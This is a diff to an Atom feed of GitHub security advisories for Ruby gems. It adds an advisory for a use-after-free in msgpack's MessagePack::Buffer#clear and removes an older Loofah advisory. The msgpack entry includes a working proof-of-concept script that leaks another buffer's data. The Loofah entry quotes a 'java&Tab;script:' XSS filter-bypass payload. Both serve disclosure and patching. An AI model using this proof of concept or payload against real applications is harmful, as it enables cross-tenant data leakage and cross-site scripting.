@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
     <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
-    <updated>2026-07-30T15:00:35.190Z</updated>
+    <updated>2026-07-30T17:13:01.191Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
     <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
@@ -11,6 +11,84 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[msgpack] MessagePack::Buffer#clear Use-After-Free that Enables Cross-Buffer Disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-4mrv-5p47-p938</id>
+        <link href="https://github.com/advisories/GHSA-4mrv-5p47-p938"/>
+        <updated>2026-07-30T16:33:13.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>MessagePack::Buffer#clear</code> shifts out every chunk and returns its 4 KiB rmem page to the shared pool, but does not reset the buffer's rmem cursor (<code>rmem_last</code>, <code>rmem_end</code>, <code>rmem_owner</code>). The next write sees "unused rmem space" left over from the freed page and hands back a slice of memory that has already been returned to the pool. A second <code>MessagePack::Buffer</code> then re-acquires that same page, so reading the cleared-and-rewritten buffer discloses the second buffer's bytes — a same-process use-after-free with cross-buffer information disclosure (and the symmetric write-corruption).</p>
+<h3 id="details">Details</h3>
+<ul>
+<li><code>msgpack_buffer_clear()</code> → <code>_msgpack_buffer_shift_chunk()</code> (<code>ext/msgpack/buffer.c:151</code>, <code>:128</code>) destroys chunks (<code>_msgpack_buffer_chunk_destroy</code>, <code>:58</code>, returns the page via <code>msgpack_rmem_free</code>) but resets only <code>tail_buffer_end</code>/<code>read_buffer</code>, leaving <code>rmem_last</code>/<code>rmem_end</code>/<code>rmem_owner</code> pointing into the freed page.</li>
+<li>Next <code>Buffer#write</code> → <code>_msgpack_buffer_chunk_malloc()</code> reuse branch (<code>:363</code>) returns <code>b-&gt;rmem_last</code>, a pointer into the already-freed page.</li>
+<li>A second buffer's first write calls <code>msgpack_rmem_alloc()</code> and gets the same physical page back from the pool → the two buffers alias the same memory.</li>
+<li>Sanitizer note: rmem (<code>ext/msgpack/rmem.h</code>) recycles pages with a slab bitmask, not <code>free()</code>, so a stock ASAN build does not abort; the cross-buffer disclosure below is the proof.</li>
+</ul>
+<h3 id="poc">PoC</h3>
+<p>Single self-contained script (builds msgpack from rubygems with AddressSanitizer, then runs the PoC):</p>
+<pre><code class="language-bash">set -e
+WORK="$(mktemp -d)"; cd "$WORK"
+
+# 1) PoC
+cat &gt; poc.rb &lt;&lt;'RUBY'
+b1 = MessagePack::Buffer.new(nil, write_reference_threshold: 256)
+b1.write('M' * 1000); b1.write('A' * 200); b1.write('N' * 1000)
+b1.clear
+b1.write('C' * 128)
+secret = ('s' * 200) + ('ABCD' * 32) + ('t' * 400)
+b2 = MessagePack::Buffer.new(nil, write_reference_threshold: 4096)
+b2.write(secret)
+leaked = b1.read_all
+donor  = b2.read_all
+puts 'b1_first64:' + leaked.byteslice(0, 64)
+puts 'b2_donor64:' + donor.byteslice(200, 64)
+puts 'leaked_is_C:' + (leaked == 'C' * 128).to_s
+puts 'cross_buffer_match:' + (leaked == donor.byteslice(200, 128)).to_s
+RUBY
+
+# 2) ASAN build of msgpackfrom rubygems
+cat &gt; Dockerfile &lt;&lt;'DOCKER'
+FROM ruby:3.3-bookworm
+RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends build-essential libasan8 &amp;&amp; rm -rf /var/lib/apt/lists/*
+RUN gem fetch msgpack -v 1.8.1 &amp;&amp; gem unpack msgpack-1.8.1.gem &amp;&amp; \
+    cd msgpack-1.8.1/ext/msgpack &amp;&amp; \
+    MSGPACK_DEBUG=1 ruby extconf.rb --with-cflags='-O0 -g -fsanitize=address -fno-omit-frame-pointer' --with-ldflags='-fsanitize=address' &amp;&amp; \
+    make -j"$(nproc)" &amp;&amp; cp msgpack.so ../../lib/msgpack/msgpack.so
+DOCKER
+docker build -t msgpack-asan-poc .
+
+# 3) Run under ASAN
+docker run --rm -v "$WORK/poc.rb:/poc.rb:ro" msgpack-asan-poc \
+  bash -c 'export LD_PRELOAD=$(gcc -print-file-name=libasan.so); export ASAN_OPTIONS=detect_leaks=0:halt_on_error=1:abort_on_error=1; RUBYLIB=/msgpack-1.8.1/lib ruby -rmsgpack /poc.rb'
+</code></pre>
+<p>Expected output:</p>
+<pre><code>b1_first64:ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD
+b2_donor64:ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD
+leaked_is_C:false
+cross_buffer_match:true
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Same-process cross-buffer information disclosure and corruption: after <code>clear</code> + reuse, one <code>MessagePack::Buffer</code> aliases another's memory, leaking or overwriting serialized data that may belong to a different request or tenant. Requires direct use of the <code>MessagePack::Buffer</code> API with a <code>clear</code>/reuse lifecycle (a supported performance pattern); not reachable from a plain <code>unpack</code> byte stream. Real-world severity <strong>Low–Medium</strong>; clear memory-safety defect with a small, localized fix.</p>
+<h3 id="credit">Credit</h3>
+<p>Pranjali Thakur - depthfirst (<a href="http://depthfirst.com">depthfirst.com</a>)</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/msgpack/msgpack-ruby/security/advisories/GHSA-4mrv-5p47-p938">https://github.com/msgpack/msgpack-ruby/security/advisories/GHSA-4mrv-5p47-p938</a></li>
+<li><a href="https://github.com/msgpack/msgpack-ruby/commit/5627d71606b565641d2dd501b82aae862f4abe90">https://github.com/msgpack/msgpack-ruby/commit/5627d71606b565641d2dd501b82aae862f4abe90</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/msgpack/CVE-2026-54522.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/msgpack/CVE-2026-54522.yml</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54522">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-54522</a></li>
+<li><a href="https://github.com/advisories/GHSA-4mrv-5p47-p938">https://github.com/advisories/GHSA-4mrv-5p47-p938</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4mrv-5p47-p938</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-07-30T16:33:12.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[mcp] MCP Ruby SDK: Ruby SSE Session Poisoning]]></title>
         <id>https://github.com/advisories/GHSA-5p9g-j988-pcwv</id>
@@ -1496,39 +1574,5 @@ service. I am not claiming code execution or information disclosure.</p>
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-07-21T18:34:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[loofah] Loofah `allowed_uri?` does not detect `javascript:` URIs split by named whitespace character references]]></title>
-        <id>https://github.com/advisories/GHSA-8whx-365g-h9vv</id>
-        <link href="https://github.com/advisories/GHSA-8whx-365g-h9vv"/>
-        <updated>2026-07-21T15:04:16.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>Loofah::HTML5::Scrub.allowed_uri?</code> does not correctly reject <code>javascript:</code> URIs when the scheme is split or prefixed by the HTML5 named character references <code>&amp;Tab;</code> (tab) or <code>&amp;NewLine;</code> (line feed).</p>
-<p>This is a bypass of the fix for <a href="https://github.com/flavorjones/loofah/security/advisories/GHSA-46fp-8f5p-pf2m">GHSA-46fp-8f5p-pf2m</a>, which handled the equivalent numeric character references (<code>&amp;#9;</code>, <code>&amp;#10;</code>, <code>&amp;#13;</code>) but did not cover the named forms.</p>
-<h2 id="details">Details</h2>
-<p><code>allowed_uri?</code> decodes HTML entities with <code>CGI.unescapeHTML</code>, which handles numeric character references but not HTML5 named character references. Payloads like <code>java&amp;Tab;script:alert(1)</code> are therefore left intact, so the method does not recognize the <code>javascript:</code> scheme and returns <code>true</code>. A browser, however, decodes <code>&amp;Tab;</code> and <code>&amp;NewLine;</code> to tab and line feed and strips them from the URL during parsing, producing <code>javascript:alert(1)</code>.</p>
-<p><code>&amp;Tab;</code> and <code>&amp;NewLine;</code> are the only relevant named character references: across the HTML5 named-character table, they are the only two that decode to characters the WHATWG URL parser strips from a URL (U+0009 and U+000A; there is no named reference for U+000D). <code>&amp;nbsp;</code> / <code>&amp;NonBreakingSpace;</code> decode to U+00A0, which browsers do not strip, so they aren't usable for this bypass.</p>
-<p>Note that Loofah's default <code>sanitize()</code> path is <strong>not</strong> affected, because Nokogiri decodes or entity-escapes HTML entities during parsing before Loofah evaluates the URI protocol. This issue only affects callers of the public <code>allowed_uri?</code> string-level helper that pass it HTML-encoded strings.</p>
-<h2 id="impact">Impact</h2>
-<p>Callers that validate a user-controlled URL with <code>Loofah::HTML5::Scrub.allowed_uri?</code> and then render the approved value into an <code>href</code> or other browser-interpreted URI attribute may be vulnerable to cross-site scripting (XSS). This includes applications that call <code>allowed_uri?</code> directly, as well as higher-level features built on top of it, such as Action Text 8.2's markdown link validation.</p>
-<h2 id="mitigation">Mitigation</h2>
-<p>Upgrade to Loofah &gt;= 2.25.2.</p>
-<h2 id="credit">Credit</h2>
-<p>Responsibly reported by GitHub user @connorshea.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/flavorjones/loofah/security/advisories/GHSA-8whx-365g-h9vv">https://github.com/flavorjones/loofah/security/advisories/GHSA-8whx-365g-h9vv</a></li>
-<li><a href="https://github.com/flavorjones/loofah/commit/5e91af861e3cdab47b91dd0b81f3afdfd13a5e19">https://github.com/flavorjones/loofah/commit/5e91af861e3cdab47b91dd0b81f3afdfd13a5e19</a></li>
-<li><a href="https://github.com/flavorjones/loofah/releases/tag/v2.25.2">https://github.com/flavorjones/loofah/releases/tag/v2.25.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-8whx-365g-h9vv">https://github.com/advisories/GHSA-8whx-365g-h9vv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8whx-365g-h9vv</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-07-21T15:04:14.000Z</published>
     </entry>
 </feed>
